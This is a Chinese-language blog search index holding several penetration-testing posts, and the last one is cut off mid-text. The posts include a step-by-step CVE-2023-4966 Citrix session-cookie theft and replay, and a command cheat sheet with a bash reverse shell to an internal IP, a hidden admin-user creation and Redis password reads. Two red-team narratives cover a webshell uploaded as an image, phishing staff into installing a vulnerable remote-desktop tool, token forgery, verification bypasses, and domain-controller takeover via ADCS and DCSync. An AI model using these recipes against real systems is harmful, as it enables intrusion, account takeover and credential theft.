<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2023-4966：Citrix Gateway内存信息泄漏</title>
      <link href="/2023/11/04/CVE-2023-4966%EF%BC%9ACitrix-Gateway%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"/>
      <url>/2023/11/04/CVE-2023-4966%EF%BC%9ACitrix-Gateway%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Citrix Gateway是一套安全的远程接入解决方案，能够提供具有身份识别和访问管理功能(IdAM) 功能的安全远程访问解决方案。在国内的话，多数为云桌面。</p><p>本文主要讲下漏洞验证以及信息的cookie利用遇到的问题，且发现这个漏洞蛮需要运气的。</p><h1 id="CVE-2023-4966利用方式"><a href="#CVE-2023-4966利用方式" class="headerlink" title="CVE-2023-4966利用方式"></a>CVE-2023-4966利用方式</h1><p>1、获取到到目标url数据包，需要构造请求，修改host，发送请求可以看到返回cookie信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /oauth/idp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: a* 24576</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/img/b3/1.png" alt="img"></p><p>2、关于这个host修改的长度，可以直接使用python运行代码print(“a” * 24576)获取一个，复制黏贴到host上。</p><p><img src="/img/b3/2.png" alt="img"></p><p>3、之后可以利用这个cookie继续构造数据包获取用户名信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /logon/LogonPoint/Authentication/GetUserName HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: NSC_AAAC= 6894c1bf7a53dcda00a9c4437c0a610f</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/img/b3/3.png" alt="img"></p><p>4、但是经过测试发现，一般有漏洞的基本返回包都能获取到一个cookie，但是能不能继续获取用户信息很多成都上看运气，绝大数都是下面这种情况，获取不到。</p><p><img src="/img/b3/4.png" alt="img"></p><p>5、而且能不能获取到用户信息也决定着这个cooki能不能更深入利用登录系统。可以理解系统当前是否有登录用户，有登录用户这个返回的cookie也随机的，不是实时登录用户cookie，就是可以理解为有的是过期的。</p><p>6、继续使用可以获取用户名那个cookie利用登录系统，F12直接在浏览器加入cookie。</p><p><img src="/img/b3/5.png" alt="img"></p><p>7、加入cookie后刷新页面即可登录系统，找到云桌面，或者远程桌面。</p><p><img src="/img/b3/6.png" alt="img"></p><p>8、但是这里也有个小问题，很多系统使用这个cookie登录的时候经常重定向登录不进去。</p><p>9、也可以使用工具检测，这里github已经有大佬放出来了：<a href="https://github.com/Chocapikk/CVE-2023-4966%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/Chocapikk/CVE-2023-4966，使用如下：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 citrix-exploit.py -u url   #单个域名</span><br><span class="line">python3 citrix-exploit.py -u url.txt   #批量检测</span><br></pre></td></tr></table></figure><p><img src="/img/b3/7.png" alt="img"></p><p>10、这里使用工具检测的话，还是回到那个运气上，可能运行一次获取不到cookie，可能多运行几次或几十次就会有(下面运行多次获取cookie)，也可能一直都不会有，一切取决系统当前是否有登录用户，但是受限于随机返回cookie。</p><p><img src="/img/b3/8.png" alt="img"></p><p>11、综合看起来可能比较鸡肋，但是运气好的话，在红蓝对抗、hw中直接起飞。</p><p>参考：<a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试常用命令</title>
      <link href="/2023/10/28/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/28/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="常用到服务器、工具等命令"><a href="#常用到服务器、工具等命令" class="headerlink" title="常用到服务器、工具等命令"></a>常用到服务器、工具等命令</h1><p>记录一些渗透测试中常用到的命令，工作更换设备的时候方便复制。</p><h1 id="Windows常用"><a href="#Windows常用" class="headerlink" title="Windows常用"></a>Windows常用</h1><p>1、新建用户及加入管理员用户组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user adminstrator nod@32! /add</span><br><span class="line">net localgroup administrator adminstrator /add</span><br></pre></td></tr></table></figure><p>2、修改用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator nod@32!</span><br></pre></td></tr></table></figure><p>3、删除用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user adminstrator /delete</span><br></pre></td></tr></table></figure><p>4、查看所有用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>5、查看当前在线用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><p>6、查看当前主机的主机名&#x2F;IP&#x2F;DNS等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>7、查看路由表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>8、查看端口开放情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>9、查看arp解析情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a </span><br></pre></td></tr></table></figure><p>10、查看进程及对应服务名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p>11、 查看管理员组成员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>12、查看系统信息含补丁信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>13、查看ipc连接情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><p>14、查看匿名共享情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><p>15、查看防火墙状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure><h1 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h1><p>1、查看当前登录域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>2、获得所有域用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>3、查看所有的域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>4、查看该域内所有主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:XXX</span><br></pre></td></tr></table></figure><p>5、查看所有域用户组列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p>6、查看域内所有的主机名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p>7、查看所有域管理员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><p>8、查看所有域控制器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><p>9、获取域信任信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p>10、查看域密码策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p>11、寻找目录中的域控制器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery server</span><br></pre></td></tr></table></figure><h1 id="Liunx常用"><a href="#Liunx常用" class="headerlink" title="Liunx常用"></a>Liunx常用</h1><p>1、查看进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -elf</span><br><span class="line"></span><br><span class="line">ps aux | grep 127.0.0.1</span><br></pre></td></tr></table></figure><p>2、解压缩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip 文件名.zip</span><br></pre></td></tr></table></figure><h1 id="其他常用"><a href="#其他常用" class="headerlink" title="其他常用"></a>其他常用</h1><p>1、反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.101.4.10/23333 0&gt;&amp;1</span><br><span class="line">nc -lvp 23333</span><br></pre></td></tr></table></figure><p>2、连接Redis，查看所有key并读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.101.4.10 -p 6379</span><br><span class="line">keys *</span><br><span class="line">get passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 快捷笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从访客到拿下内网域控</title>
      <link href="/2023/10/27/%E4%BB%8E%E8%AE%BF%E5%AE%A2%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7/"/>
      <url>/2023/10/27/%E4%BB%8E%E8%AE%BF%E5%AE%A2%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次企业开放式红蓝演练，从外网探索到拿下内网域控的过程，整理了一些过程。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>1、开始根据提供的公司名称，到处收集了一些域名整合到一个表里面，在筛选查找登录、管理、vpn等特殊的资产时，找到一个更特殊些的存在，SRC平台。就感觉比较难搞了，估计到处都被白帽子光顾过了。</p><p><img src="/img/b2/b21.png" alt="img"></p><p>2、找到一个vpn资产，但是访问服务出错。后面在测其他资产的时候发现有waf拦截，探测fastjson、SQL注入啥的直接就拦截了。</p><p><img src="/img/b2/b22.png" alt="img"></p><p>3、继续收集的时候，使用公司名称在微信搜索小程序，找到访客预约小程序，对小程序抓包获取到域名，发现小程序管理后台。使用邮箱登录且存在验证码。</p><p><img src="/img/b2/b23.png" alt="img"><img src="/img/b2/b24.png" alt="img"></p><p>4、根据这个访客管理后台登录页面的html特征，在fofa上搜索了一下，发现有不少相关的资产，找到几个应该更老的版本，可以用前台用户名密码登录，有的没有验证码。</p><p><img src="/img/b2/b25.png" alt="img"><img src="/img/b2/b26.png" alt="img"></p><p>5、想着看能不能在这几个老版本找到些未授权的接口，尤其是上传接口，就花了点时间测了一下：</p><blockquote><p><font color="#FF1493">试了几个系统在其中一个弱口令密码进去了，发现了SQL注入、垂直越权，但都是在登录后才能利用。垂直越权访问应该是用户管理接口，返回了创建用户的信息，明文密码也被带出来了，发现创建的用户都是统一用一个邮箱用户创建的，这个邮箱后缀发现跟这个访客产品公司的域名一样，猜测这个访客系统存在默认账户：<code>test@test.com</code>，而且根据这个带出的明文密码频率最高的密码，猜测可能是默认密码：<code>test123</code></font></p></blockquote><p><img src="/img/b2/b27.png" alt="img"><img src="/img/b2/b28.png" alt="img"></p><p>6、带着猜测的<code>test@test.com/test123</code>的默认账号去我的目标访客系统尝试登录，成功登录这个访客预约的后台。</p><p><img src="/img/b2/b29.png" alt="img"></p><p>7、进入后台，分别找到了很重要的两个信息，部分企业员工部门、工号信息，部分应该是内网办公地址ip。</p><p><img src="/img/b2/b210.png" alt="img"><img src="/img/b2/b211.png" alt="img"></p><p>8、后面对这个管理后台没有发现命令执行、上传漏洞的地方，因为知道有waf，发现的SQL注入都没有过度花时间去利用。</p><p>9、在收集到的资产下载到了企业办公应用ios、安卓版本，工号已经有了，但是没有密码。App随便测试登录抓包看了下，果不其然被加密了，后面对这个app hook了一下，使用动态解密算法工具发现是<code>aes加密</code>。</p><p><img src="/img/b2/b212.png" alt="img"><img src="/img/b2/b213.png" alt="img"></p><p>10、返回去在那个访客管理后台查看组织架构，发现很多测试账号，猜测可能开发这个系统测试生成的，或者本来就是这个企业有的一些测试账号。</p><p><img src="/img/b2/b214.png" alt="img"></p><p>11、使用这些测试手机号和这个访客管理后台的默认密码去登录app，发现密码错误，但是确认了可以登录。测试直接使用123456作为密码，有1个测试手机号码成功登录。</p><p><img src="/img/b2/b215.png" alt="img"></p><p>12、进入app后，对个人信息头像上传的功能进行抓包测试，发现可以修改上传文件名后缀，但是上传时会对图片强制进行裁剪，不会原图等比大小上传，且上传进行<code>imgBase64加密</code>。</p><p><img src="/img/b2/b216.png" alt="img"><img src="/img/b2/b217.png" alt="img"></p><p>13、经过多次测试上传发现几个问题：</p><blockquote><p><font color="#FF1493">1，imgBase64上传是以json格式传递，但base64编码之后的数据为二进制，需要用ascii解码之后才可以放入json中</font><br><font color="#FF1493">2，不能直接将webshell代码直接imgBase64编码后放到数据包上传，直接报错，会对上传内容<code>检测图片属性</code></font><br><font color="#FF1493">3，不能将合成的jsp图片马通过上传页面上传，裁剪过后图片马损失原来的字节，即造成图片马不完整</font></p></blockquote><p>14、所以在本地生成一张字节内容很小的png文件，和一个含有打印代码<code>&lt;%out.println(&quot;i am sircong&quot;);%&gt;</code>的jsp文件，（因为第一次这样上传，不清楚是否可行，所以不直接上传webs hell，先上传print代码看看有没有执行的可能）。</p><p><img src="/img/b2/b218.png" alt="img"></p><p>15、将该两个文件通过cmd命令生成一张jsp图片马1.png，用Notepad++打开可以看到jsp代码追加到图片内容里面去了。</p><p><img src="/img/b2/b219.png" alt="img"><img src="/img/b2/b220.png" alt="img"></p><p>16、使用python写一个imgBase64加密脚本，直接本地对合成的图片马1.png进行imgBase64加密，将生成加密信息在数据包替换内容上传，修改后缀名为jsp，成功上传返回地址。</p><p><img src="/img/b2/b221.png" alt="img"><img src="/img/b2/b222.png" alt="img"></p><p>17、访问上传的伪jsp图片马，发现代码成功执行打印输出i am sircong，说明当前上传“图片马“的方式可行。</p><p><img src="/img/b2/b223.png" alt="img"></p><p>18、再次cmd生成一个含有哥斯拉webshell的jsp图片马imgBase64加密处理上传，得到存储路径。</p><p><img src="/img/b2/b224.png" alt="img"><img src="/img/b2/b225.png" alt="img"></p><p>19、使用哥斯拉连接，成功连接获取服务器root权限。</p><p><img src="/img/b2/b226.png" alt="img"></p><p>20、至此进入内网，利用这台服务器使用nps+Proxifier Socks5代理到本地，ping一下在访客后台发现的的登录内网ip，成功ping通，说明后台记录的ip确实可能是办公网ip。</p><p><img src="/img/b2/b227.png" alt="img"></p><p>21、因为我对进入办公网后有扫描公开共享文件的习惯，对访客后台发现的ip段，扫描了一下，有几个共享文件夹，但是没有权限访问。</p><p><img src="/img/b2/b228.png" alt="img"></p><p>22、因为我的最大的目标的就是域控，但是现在我没有一台域内windows机器，也没一个域内用户的账号和密码，扫描了发现的IP段，看看有没有向日葵没有更新版本的，但是没有发现一台。后来在访客管理后台看到的组织架构上找了几个行政的工号和姓名在app搜了一下，可以搜到打开聊天，就用个测试账号伪装成it支持人员，发了一份假的报告和一个向日葵RCE版本给他们，因为那个app聊天页面有很密的公司水印，打码之后简直不能看，这里用微信聊天还原一下。</p><p><img src="/img/b2/b229.png" alt="img"><img src="/img/b2/b230.png" alt="img"></p><p>23、发软件给他好一会儿没反应，搞得我很急，因为我登录app是用得一个测试账号，名字是testtest1234，还以为这个公司大几千人他刚好和it支持的人同一个办公区，他去找人求证了。等了快10多分钟左右，他才回复说安装好了给我连接码远程到他桌面，后面装模做样调出cmd搞，这边又赶紧扫描的他的IP，确认端口，执行远程命令修改了他电脑administrator的密码。</p><p><img src="/img/b2/b231.png" alt="img"></p><p>24、等到了大概吃饭午休时间，用administrator登录电脑，目标是在他看浏览器有没有保存密码，本地有没有什么记录的密码的文件。在Google获取了保存的密码外，在他桌面文件夹找到了一个常用网址.txt，获取到了几个其他员工的账号。</p><p><img src="/img/b2/b232.png" alt="img"><img src="/img/b2/b233.png" alt="img"></p><p>25、不过更重要的是在他桌面文件夹发现了一个会议室投屏表格，里面记录了好几个会议室投屏电脑IP地址及登录名密码！</p><p><img src="/img/b2/b234.png" alt="img"></p><p>26、有了员工账密，尝试去登录那个app，不出意外的需要短信验证。</p><p><img src="/img/b2/b235.png" alt="img"></p><p>27、因为后面在拿一些系统目标的时候，有的需要这个app扫码登录，有的需要绑定手机号码登录，这里先说下对这个app后台的超管的获取，和手机号码绑定问题。</p><p>28、后面在横移到员工的电脑上，发现都有一个工作台平台，这个上面可以更改绑定手机号码，但是更改的时候会进行旧手机验证。</p><p><img src="/img/b2/b236.png" alt="img"></p><p>29、后面测试验证的时候不获取手机验证码随便输入数字然后抓包，在返回包中将参数row的值改为1即可绕过这步验证，输入自己的号码获取验证码进行绑定。</p><p><img src="/img/b2/b237.png" alt="img"><img src="/img/b2/b238.png" alt="img"></p><p>30、后面发现这样想要用一个员工的账号扫码的时候都要这样操作一下，太麻烦了，就试着找到app的管理后台，获取到超管权限应该有权限去改所有员工的手机号码。</p><p>31、后面拿到域控后搜索特定人员电脑登录，得到了地址和一个普通管理员权限，使用工号密码+验证码登录，抓包发现返回包有个token，但是是加密的，在前端搜索token发现使用aes加密，并且发现密钥和向量。</p><p><img src="/img/b2/b239.png" alt="img"><img src="/img/b2/b240.png" alt="img"></p><p>32、但是用这个密钥和向量根本解不开这个token，后来因为想起这个app登录的时候也是使用的aes加密，用这个app登录时hook得到aes密钥和向量可以解开token，解密发现token加密信息为：系统用户userid:时间戳:系统用户名（工号）:其他:其他。</p><p><img src="/img/b2/b241.png" alt="img"><img src="/img/b2/b242.png" alt="img"></p><p>33、登录后在页面点击头像遍历userid可以得到所有管理员信息，得到超管userid：72769，超管用户名为：superAdmin，构造超管token,，替换相关userid，当前时间戳，系统名称进行加密，用伪造的token在登录抓包替换返 回包的token，成功获取超管权限，后台添加了一个超管权限进行权限维持。</p><p><img src="/img/b2/b243.png" alt="img"><img src="/img/b2/b244.png" alt="img"><img src="/img/b2/b245.png" alt="img"></p><p>34、至此拿到了app后台超管权限，可以对所有员工更改手机号码，解决后面在一些重要系统扫码验证的问题。</p><p>35、再回来继续讲拿域控的过程，因为我已经拿到了几个员工账密，和几台pc端权限。</p><p>36、为了后续目标部门特定员工用户定位搜索，同时对域内环境分析提供打下域控的可能，先对域内使用SharpHound进行数据采集，传出来导进到BloodHound，发现域用户快上万个了。</p><p><img src="/img/b2/b246.png" alt="img"><img src="/img/b2/b247.png" alt="img"></p><p>37、执行命令知道当前域控主机。</p><p><img src="/img/b2/b248.png" alt="img"></p><p>38、因为我一开始选定打域控的方式就是证书模板漏洞（主要傻瓜式操作，适合我这种脚本小子），使用得到的员工账号和密码，用Certipy探测了一下，发现vuln的只有一个esc8证书。</p><p><img src="/img/b2/b249.png" alt="img"></p><p>39、在已有权限的办公pc上执行certutil -config - -ping 查看证书，知道了证书名称、证书服务器。</p><p><img src="/img/b2/b250.png" alt="img"></p><p>40、直接ping证书服务器计算机名，得到ip地址，然后使用IP地址构造证书web服务地址<a href="http://127.0.0.1/certsrv/certfnsh.asp%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1web%E5%9C%B0%E5%9D%80%E7%A1%AE%E5%AE%9E%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%EF%BC%8C%E8%80%8C%E4%B8%94%E8%AE%BF%E9%97%AE%E4%B8%8D%E6%98%AF403%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E3%80%82">http://127.0.0.1/certsrv/certfnsh.asp，发现证书服务web地址确实可以访问，而且访问不是403禁止访问。</a></p><p><img src="/img/b2/b251.png" alt="img"><img src="/img/b2/b252.png" alt="img"></p><p>41、同时，在BloodHound上检索了一下Certificate Service服务，发现存在Certificate Service服务，也就是也可能可以用机器账户申请域控的机器证书获取域控权限（CVE-2022-26923）。</p><p><img src="/img/b2/b253.png" alt="img"></p><p>42、有两个获取域控权限可能，想着我都是碰运气，先试了机器账户申请证书的漏洞，从简单的开始搞。使用工具bloodyAD先查看下ms-DS-MachineAccountQuota属性，看到结果为100000，只要大于0就可以创建机器账户。</p><p><img src="/img/b2/b254.png" alt="img"></p><p>43、之后再使用工具Certipy添加一个机器账户，并将它的dns改为与域控机器相同。</p><p><img src="/img/b2/b255.png" alt="img"></p><p>44、用创建的机器账户hacker1$去申请机器证书，成功申请到证书。</p><p><img src="/img/b2/b256.png" alt="img"></p><p>45、再去验证证书是否有效，成功获取到哈希。</p><p><img src="/img/b2/b257.png" alt="img"></p><p>46、通过 impacket 套件中的 secretsdump.py 使用该票据，并执行 DCSync 来转储域用户哈希，成功获取到域控机器administrator的hash。</p><p><img src="/img/b2/b258.png" alt="img"></p><p>47、使用获取到的域控 Administrator 用户的票据，通过 wmiexec.py 获取到域控制器的最高权限。</p><p><img src="/img/b2/b259.png" alt="img"></p><p>48、机器没有开放3389端口，执行命令开启远程桌面，登录至域控机器。</p><p><img src="/img/b2/b260.png" alt="img"></p><p>49、至此，就拿到了域控权限，权限维持的过程跳过，再说一下后面一个让我震惊的发现。</p><p>50、后面在域内搜索一些权限比较大的用户时，找到一个运维工程师。</p><p><img src="/img/b2/b261.png" alt="img"></p><p>51、在他电脑上发现一个文件夹，里面有一个域相关运维脚本，打开浏览这个脚本代码发现他们给域用户加域的时候会直接给电脑本地administrator的密码设置成一个很简单的弱口令：公司名@123. ,顿时在想会不会域内所有员工电脑administrator的密码都是这个。</p><p><img src="/img/b2/b262.png" alt="img"><img src="/img/b2/b263.png" alt="img"></p><p>52、后面为了验证一下这个猜想，就写了脚本跑了几个不同ip段的员工办公ip，直接使用administrator&#x2F;公司名@123.登录rdp测试一下，发现跑的十多个ip都成功了，这不是全员密码裸奔。</p><p><img src="/img/b2/b264.png" alt="img"></p><p>53、至此，域控，员工通用密码，手机app扫码验证都搞定了，利用这些不断在内网扩展，拿到想要的目标。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 域控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次域控探索</title>
      <link href="/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%9F%E6%8E%A7%E6%8E%A2%E7%B4%A2/"/>
      <url>/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%9F%E6%8E%A7%E6%8E%A2%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间，搞了个红蓝渗透测试，大概整理记录一下那次渗透测试。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>1，提供的只有一个公司名称，搞到域名后缀直接鹰图语法检索，直接导出结果，看看有没有vpn、登录、管理等特殊的资产筛选出来。</p><p><img src="/img/b1/b11.png" alt="img"></p><p>2，访问很多域名发现登录都是有个统一登录认证页面的，测试登录数据包发现工号密码都被加密到一个参数info里面去了。</p><p><img src="/img/b1/b12.png" alt="img"><img src="/img/b1/b13.png" alt="img"></p><p>3，因为没有提供工号给我，只能自己找了。打开抖音，搜索【****离职了】，顺利得到工号规则。</p><p><img src="/img/b1/b14.png" alt="img"></p><p>4，用得到的工号规则，生成一批工号，因为登陆的请求数据包是加密的，不太好用burpsuite爆破，就直接用<code>python Selenium </code>写了个自动登录爆破的脚本，用生成的工号去撞同一个密码，虽然效率低，好在得到了十多个弱口令工号。</p><p><img src="/img/b1/b15.png" alt="img"><br><img src="/img/b1/b16.png" alt="img"></p><p>5，登录后以为能找到个上传口啥的getshell，或者命令执行地方，但是都没有，连SQL注入都没搞到，文件上传限制的死死的！只能上传jpg、xlsx。</p><p><img src="/img/b1/b17.png" alt="img"></p><p>6，因为近两年疫情办公，vpn、云主机办公比较常见，尝试用这些账号去登录vpn什么的。在导出的web资产里面找到查找vpn相关资产，顺利找到4条vpn资产。https:&#x2F;&#x2F; <em><strong>.vpn.com、https:&#x2F;&#x2F;</strong></em>*.vpn.com。访问vpn登录时，提示下载vpn，且发现除了密码还需要动态口令，但是这个动态口令在他们自研的办公app上才能拿到。</p><p><img src="/img/b1/b18.png" alt="img"></p><p>7，另外，也发现2个web资产是Citrix Gateway虚拟桌面。登录也存在这个动态口令，没有办法下手。</p><p><img src="/img/b1/b19.png" alt="img"></p><p>8，根据vpn安装页面提示下载安装那个手机app，用工号密码登录，但是会进行新设备登录校验，需要这个工号绑定的手机短信验证码。</p><p><img src="/img/b1/b110.png" alt="img"></p><p>9，其实到这里，我放弃这个动态口令了，转去挖其他相关资产的漏洞了，看能不能找到突破口。但是没有挖到有价值的，又转回来对这个app测试。</p><p>10，首先就是看能不能绕过这个新手机登录验证。截取登录请求包，发现返回包有个字段<code>loginType</code>，它的参数值是<code>CHANGE_DEVICE</code>，字面意思就是更换设备。</p><p><img src="/img/b1/b111.png" alt="img"></p><p>11，使用jadx反编译这个app，然后直接检索关键字·loginType<code>，然后发现关键代码，记录这个参数值</code>NORMAL&#96;。</p><p><img src="/img/b1/b112.png" alt="img"></p><p>12、app再次重新登录截取数据包，并修改返回包中的<code>loginType</code>参数值为<code>NORMAL</code>，成功绕过了新手机登录验证登录进app。找到动态口令获取的窗口。</p><p><img src="/img/b1/b113.png" alt="img"></p><p>13，有了动态口令，去尝试登录那个Citrix Gateway虚拟桌面，发现试了几个用户都没有使用的权限，试了十多个账号后，终于搞到一个登录到虚拟桌面了。</p><p><img src="/img/b1/b114.png" alt="img"><img src="/img/b1/b115.png" alt="img"></p><p>14，登录虚拟桌面后后先确认了两个事，1.确定能上网，2.安装了卡巴斯基。在google浏览器收藏导航栏发现了内部自研办公oa系统，及堡垒机登录地址（存在动态口令）。用之前撞的工号去登录这个办公系统，都可以登录，但是因为职位不同，看到功能栏略微不同。</p><p><img src="/img/b1/b116.png" alt="img"></p><p>15、这里不再赘述我对这个oa系统的测试了。直接讲我后续对域控的探索之路。因为这是虚拟桌面，不是真正的办公区网段（在这尝试打了域控，未果），所以我在这个虚拟机器上装了python然后简单开了个web服务，然后登录那个办公app windows版，这里还是用的之前撞的那一批工号，登录后找了个群聊人多点的发了下面这样一句话，把web服务的链接附上，主要的目的是获取真正的办公网段。查看访问记录，获取到十多个C段地址。</p><p><img src="/img/b1/b117.png" alt="img"><img src="/img/b1/b118.png" alt="img"></p><p>16、得到了办公地址段，先是用工具扫描了下共享文件夹信息，主要是看有没有开发什么的把业务系统、数据库用户名密码什么的共享出来。</p><p><img src="/img/b1/b119.png" alt="img"><img src="/img/b1/b120.png" 